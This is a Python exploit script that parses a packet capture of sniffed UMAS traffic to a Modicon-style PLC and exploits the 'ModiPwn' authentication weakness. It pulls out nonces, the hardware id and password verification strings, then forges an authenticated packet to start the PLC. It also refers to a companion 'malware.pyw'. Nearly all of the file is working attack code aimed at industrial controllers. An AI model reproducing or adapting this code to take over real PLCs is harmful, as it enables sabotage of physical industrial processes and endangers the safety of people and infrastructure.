# Written by G. Renault - 10/03/23
# This script reads a wireshark log (i.e. wireshark_log_file) and exploits the ModiPwn vulnerability to create the payload to control the PLC's process.
# REQUIREMENT: AUTHENTICATION SCENARIO

from scapy.all import *
import codecs
from hashlib import sha256
import base64
import os
from string import hexdigits


def sha256_digest(input: str, base64_hash_b: bool = False) -> str:
    """Returns the SHA256 digest (encoded in base64 if base64_hash_b is True) of the given input

    Args:
        input (str): Input given to the hash function

    Returns:
        str: SHA256(input) encoded in base64
    """

    def is_hex_str(s):
        return set(s).issubset(hexdigits)

    m = sha256()
    if type(input) == bytes:
        m.update(input)
    elif is_hex_str(input):  # Raw hex
        m.update(bytes.fromhex(input))

    if base64_hash_b:
        return base64.b64encode(m.digest()).decode()
    return m.digest()


# Path of this script
path = os.path.dirname(os.path.abspath(__file__))

# Load pcap file
wireshark_log_file = (
    # set-string-000.pcapng"  #
    path
    + "/wireshark_log_capture.pcapng"  # NOTE: Modify this with your wireshark log capture of the sniffed UMAS communication
)
packets = rdpcap(wireshark_log_file)

read_next_packet_info = False
read_next_packet_HW_id = False
read_next_packet_check_byte = False
nbr_keep_alive = 0

# Iterate over packets
for i, packet in enumerate(packets):
    sub_layer = packet.getlayer(3)
    if str(sub_layer) == "Raw":
        try:
            if bytes(sub_layer)[9] == 0x50:
                print(f"Keep Alive packet")

            if (
                int.from_bytes(bytes(sub_layer)[9:14], "big") == 0x5015000301
            ):  # “Monitor” (aka read/write) system bits and words

                # header : int.from_bytes(bytes(sub_layer)[9:14], "big")
                # write/read : int.from_bytes(bytes(sub_layer)[14:16], "big")
                # Length : int.from_bytes(bytes(sub_layer)[16:18], "big")
                # Action : int.from_bytes(bytes(sub_layer)[18:22], "big")
                # Code : int.from_bytes(bytes(sub_layer)[22:26], "big")
                # Sys. bit : int.from_bytes(bytes(sub_layer)[26:30], "big")
                # Sys. bit to read + 4 (little endian) : int.from_bytes(bytes(sub_layer)[30:34], "little")
                # Unknown : int.from_bytes(bytes(sub_layer)[34:37], "big")
                # IF READ
                # Unknown2 : int.from_bytes(bytes(sub_layer)[37:39], "big")
                # Last 4 bytes : int.from_bytes(bytes(sub_layer)[39:43], "big")

                # IF WRITE
                # Value to write : int.from_bytes(bytes(sub_layer)[37:], "big") # Depends on value to write
                # Unknown2 : int.from_bytes(bytes(sub_layer)[**:**], "big")
                # Last 4 bytes : int.from_bytes(bytes(sub_layer)[**:**], "big")

                print("Monitor packet found")
                if (
                    int.from_bytes(bytes(sub_layer)[14:16], "big") == 0x0CEC
                ):  # Write packet
                    print("Write packet found")
                    print(
                        f"Write at addr. {hex(int.from_bytes(bytes(sub_layer)[30:34], 'little'))}"
                    )
                    print(
                        f"The value to write is {hex(int.from_bytes(bytes(sub_layer)[37:53], 'big'))}"
                    )
                    print(bytes(sub_layer).hex("-"))

            if bytes(sub_layer)[9] == 0x20:
                if (
                    bytes(sub_layer)[11] == 0x14
                    and bytes(sub_layer)[12] == 0x00
                    and bytes(sub_layer)[13] == 0x00
                    and bytes(sub_layer)[14] == 0x00
                ):
                    read_next_packet_info = True

            if bytes(sub_layer)[9] == 0x40:
                print("PLC starts")

            if bytes(sub_layer)[9] == 0x41:
                print("PLC stops")

            if bytes(sub_layer)[9] == 0x02:
                read_next_packet_HW_id = True

            if bytes(sub_layer)[9] == 0x6E:
                print(
                    "Client (PC) sent authenticated session request associated with a nonce"
                )
                client_nonce = bytes(sub_layer)[0x45 - 0x36 : 0x64 + 1 - 0x36].hex()
                print(f"Client nonce is : {client_nonce}")

            if bytes(sub_layer)[9] == 0xFE:
                if len(bytes(sub_layer)) > 11:
                    if bytes(sub_layer)[11] == 0xAA:
                        print(
                            "Server (PLC) sent authenticated session response associated with a nonce"
                        )
                        server_nonce = bytes(sub_layer)[
                            0x42 - 0x36 : 0x61 + 1 - 0x36
                        ].hex()
                        print(f"Server nonce is : {server_nonce}")

                if read_next_packet_info:
                    read_next_packet_info = False

                    print(f"Inspecting frame {i}")
                    project_name = str(
                        bytes(sub_layer)[0x143 - 0x36 : 0x148 + 1 - 0x36]
                    )[
                        1:
                    ]  # NOTE: Must be updated accordig to project name length (or see malware.pyw for a smarter way)
                    print(f"- Name of the project is: {project_name}")
                    ciphered_programm_pwd = str(
                        bytes(sub_layer)[0x14C - 0x36 : 0x153 + 1 - 0x36]
                    )[
                        1:
                    ]  # NOTE: Must be updated accordig to password length (or see malware.pyw for a smarter way)
                    print(f"- Application password: {ciphered_programm_pwd}")
                    verify_str_app_pwd = (
                        str(bytes(sub_layer)[0x155 - 0x36 : 0x160 + 1 - 0x36])[1:],
                        str(bytes(sub_layer)[0x163 - 0x36 : 0x18E + 1 - 0x36])[1:],
                    )  # NOTE: Must be updated accordig previous info length (or see malware.pyw for a smarter way)
                    print(
                        f"- String to verify application password is: {verify_str_app_pwd}"
                    )
                    version = str(bytes(sub_layer)[0x194 - 0x36 : 0x198 + 1 - 0x36])[
                        1:
                    ]  # NOTE: Must be updated accordig to version length (or see malware.pyw for a smarter way)
                    print(f"- Version of Unity Pro is: {version}")
                    computer_name = str(
                        bytes(sub_layer)[0x19C - 0x36 : 0x1AA + 1 - 0x36]
                    )[1:]
                    print(
                        f"- Computer name is: {computer_name}"
                    )  # NOTE: Must be updated accordig to computer name length (or see malware.pyw for a smarter way)
                    file_path = str(bytes(sub_layer)[0x1AC - 0x36 : 0x1F9 + 1 - 0x36])[
                        1:
                    ]  # NOTE: Must be updated accordig to file path length (or see malware.pyw for a smarter way)
                    print(f"- Path to project file is: {file_path}")

                    print("--- WHITE BOX EXPLANATIONS ---")
                    password = "application"  # NOTE: What was the password entered by the user ?
                    print(f"Password set by the user : {password}")
                    pwd_encoded = password.encode(encoding="utf-16-le").hex()
                    print(f"Encoded password (i.e. pwd_encoded) is : 0x{pwd_encoded}")
                    print(
                        f"1st string to verify application password is : {verify_str_app_pwd[0]}"
                    )
                    base64_1_decoded = base64.b64decode(
                        verify_str_app_pwd[0][1:-1]
                    ).hex()  # NOTE: Must be updated accordig to previous info length (or see malware.pyw for a smarter way)
                    base64_2_decoded = verify_str_app_pwd[1][1:-1]
                    base64_str = bytes(sub_layer)[
                        0x155 - 0x36 : 0x190 + 1 - 0x36
                    ].hex()  # NOTE: Must be updated accordig to previous info length (or see malware.pyw for a smarter way)
                    print(
                        f"Decoded 1st string to verify application password (i.e. base64_1_decoded) is : {base64_1_decoded}"
                    )
                    m = sha256()
                    m.update(bytes.fromhex((base64_1_decoded + pwd_encoded)))
                    print(
                        f"SHA256(base64_1_decoded + pwd_encoded) ={base64.b64encode(m.digest()).decode()}"
                    )
                    print(
                        f"2nd string to verify application password is : {base64_2_decoded}"
                    )
                    print(
                        f"Matching ? {base64_2_decoded == base64.b64encode(m.digest()).decode()}"
                    )
                    print("--- END ---")

                if read_next_packet_HW_id:
                    read_next_packet_HW_id = False
                    hw_id = bytes(sub_layer)[0x4E - 0x36 : 0x51 + 1 - 0x36].hex()
                    print(f"Hardware id is : 0x{hw_id}")

                if read_next_packet_check_byte:
                    read_next_packet_check_byte = False
                    check_byte = str(
                        bytes(sub_layer)[0x40 - 0x36 : 0x40 + 1 - 0x36].hex()
                    )
                    print(f"Check byte is : 0x{check_byte}")

            if (
                bytes(sub_layer)[9] == 0x10
                and bytes(sub_layer)[12] == 0x00
                and bytes(sub_layer)[13] == 0x00
            ):
                print(f"Client makes a reservation")
                auth_hash = str(bytes(sub_layer)[0x55 - 0x36 : 0x94 + 1 - 0x36])[2:-1]
                print(f"ASCII SHA256 auth_hash = {auth_hash}")
                m = sha256()
                m.update(bytes.fromhex(server_nonce + base64_str + client_nonce))
                print(
                    f"SHA256(server_nonce + base64_str + client_nonce) = {m.hexdigest()}"
                )
                print(f"Matching ? {m.hexdigest() == auth_hash}")
                read_next_packet_check_byte = True

        except Exception:
            pass

try:
    m = sha256()
    m.update(bytes.fromhex(hw_id + client_nonce))
    auth_hash_pre = m.digest()
    print(f"auth_hash_pre = {m.hexdigest()}")
    m = sha256()
    m.update(bytes.fromhex(hw_id + server_nonce))
    auth_hash_post = m.digest()
    print(f"auth_hash_post = {m.hexdigest()}")
    m = sha256()
    to_send = b"\x5a" + bytes.fromhex(check_byte) + b"\x40\xFF\x00"
    print(f"to_send = {to_send}")
    m.update(auth_hash_pre + to_send + auth_hash_post)
    auth_hash_2 = m.digest()
    print(auth_hash_2)
    start_plc_pkt = (
        b"\x5a" + bytes.fromhex(check_byte) + b"\x38\01" + auth_hash_2 + to_send
    )
    print(f"start_plc_pkt = {start_plc_pkt}")
except NameError:
    pass
